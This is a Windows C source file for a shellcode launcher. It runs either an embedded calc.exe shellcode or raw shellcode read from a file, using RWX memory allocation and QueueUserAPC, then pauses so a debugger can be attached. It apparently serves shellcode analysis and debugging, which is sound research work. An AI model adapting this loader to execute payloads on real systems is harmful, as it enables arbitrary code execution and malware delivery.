#include <stdio.h>
#include <windows.h>
#include <string.h>

int main(int argc, char* argv[]) {

	printf("\n");
	printf("#########################################\n");
	printf("# Shellcode Launcher using QueueUserAPC #\n");
	printf("#########################################\n");

	char* shellcode;
	int shellcode_size = 0;
	char* appname;
	appname = argv[0];
	FILE* fptr;

	if (argc == 1) {
		printf("[-] Using Calc Shell\n");
		char default_shell[] = \
			"\x89\xe5\x83\xec\x20\x31\xdb\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b\x5b"
			"\x1c\x8b\x1b\x8b\x1b\x8b\x43\x08\x89\x45\xfc\x8b\x58\x3c\x01\xc3"
			"\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7\x89\x7d\xf8\x8b\x4b\x24"
			"\x01\xc1\x89\x4d\xf4\x8b\x53\x1c\x01\xc2\x89\x55\xf0\x8b\x53\x14"
			"\x89\x55\xec\xeb\x32\x31\xc0\x8b\x55\xec\x8b\x7d\xf8\x8b\x75\x18"
			"\x31\xc9\xfc\x8b\x3c\x87\x03\x7d\xfc\x66\x83\xc1\x08\xf3\xa6\x74"
			"\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf4\x8b\x55\xf0\x66\x8b\x04\x41"
			"\x8b\x04\x82\x03\x45\xfc\xc3\xba\x78\x78\x65\x63\xc1\xea\x08\x52"
			"\x68\x57\x69\x6e\x45\x89\x65\x18\xe8\xb8\xff\xff\xff\x31\xc9\x51"
			"\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\x41\x51\x53\xff"
			"\xd0\x31\xc9\xb9\x01\x65\x73\x73\xc1\xe9\x08\x51\x68\x50\x72\x6f"
			"\x63\x68\x45\x78\x69\x74\x89\x65\x18\xe8\x87\xff\xff\xff\x31\xd2"
			"\x52\xff\xd0";

		shellcode = default_shell;
		shellcode_size = sizeof(default_shell);

	}
	else if (argc ==2)
	{

		//Read binary file, load as shellcode
		if (fopen_s(&fptr, argv[1], "rb") != 0 ) {

			printf("Error! Unable to open file");
			exit(1);
		}
	
		//Get size of binary file
		fseek(fptr, 0, SEEK_END);
		long fsize = ftell(fptr);
		fseek(fptr, 0, SEEK_SET); 

		//Malloc space for shellcode
		shellcode = (char*)malloc(fsize+1);
		shellcode_size = fsize;

		//Read content into malloc space
		fread(shellcode, sizeof(char), fsize, fptr);
		printf("[-] %d bytes read\n", fsize);

		fclose(fptr);
	}
	else {
		printf("Usage: %s [binary_file]\n", appname);
		exit(1);
	}

	HANDLE hthread = OpenThread(16, 0, GetCurrentThreadId());
	LPVOID buffer = VirtualAllocEx(GetCurrentProcess(), 0, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	CopyMemory(buffer, shellcode, shellcode_size);

	printf("[-] Shellcode loaded to: %p\n", buffer);

	QueueUserAPC((PAPCFUNC)buffer, hthread, (ULONG_PTR)buffer);

	printf("[-] Pls attach your debugger to: %s\n", appname);
	printf("[-] Set Breakpoint at : %p\n", buffer);

	printf("\nPress Any Key to Continue\n");

	getch();

	SleepEx(5, 3);
}